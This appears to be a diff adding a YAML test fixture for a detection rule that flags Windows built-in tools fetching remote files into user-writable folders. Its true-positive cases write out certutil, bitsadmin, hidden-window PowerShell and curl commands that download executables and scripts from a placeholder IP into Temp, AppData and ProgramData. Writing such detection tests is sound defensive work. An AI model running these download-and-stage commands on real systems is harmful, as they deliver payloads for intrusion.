@@ -1,0 +1,65 @@
+true_positives:
+  - name: certutil urlcache fetch into Temp
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\Users\bob\AppData\Local\Temp\a.exe'
+  - name: bitsadmin transfer into AppData
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: 'bitsadmin /transfer j /download /priority high http://198.51.100.9/b.dll C:\Users\bob\AppData\Roaming\b.dll'
+  - name: PowerShell Invoke-WebRequest writing into Temp
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell -nop -w hidden Invoke-WebRequest https://198.51.100.9/c.ps1 -OutFile C:\Windows\Temp\c.ps1'
+  - name: curl into the public profile
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\curl.exe'
+      CommandLine: 'curl.exe -s https://198.51.100.9/d.exe -o C:\Users\Public\d.exe'
+  - name: staging into ProgramData
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil -urlcache -f https://198.51.100.9/e.bin C:\ProgramData\e.bin'
+
+true_negatives:
+  # Each of these breaks exactly one of the three conditions, so the suite proves
+  # all three are load-bearing rather than decorative.
+  - name: certutil doing ordinary certificate work, no URL at all
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -dump C:\Users\bob\AppData\Local\Temp\corp.cer'
+  - name: a LOLBin fetching a URL but writing to Program Files, not a user path
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\curl.exe'
+      CommandLine: 'curl.exe -s https://updates.corp.example/patch.zip -o C:\Program Files\CorpApp\patch.zip'
+  - name: PowerShell fetching a URL with no output path in the command line
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell -c (Invoke-WebRequest https://status.corp.example/health).StatusCode'
+  - name: a non-LOLBin writing into Temp from a URL-shaped argument
+    event:
+      EventID: 4688
+      Image: 'C:\Program Files\CorpApp\updater.exe'
+      CommandLine: 'updater.exe --source https://updates.corp.example/x --dest C:\Users\bob\AppData\Local\Temp\x'
+  - name: bitsadmin listing jobs rather than transferring
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: 'bitsadmin /list /allusers /verbose'
+  - name: a local file copy into Temp with no network fetch
+    event:
+      EventID: 4688
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil -encode C:\Users\bob\Documents\in.txt C:\Users\bob\AppData\Local\Temp\out.b64'
+  - name: not a process-creation event
+    event:
+      EventID: 4624
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\Users\bob\AppData\Local\Temp\a.exe'
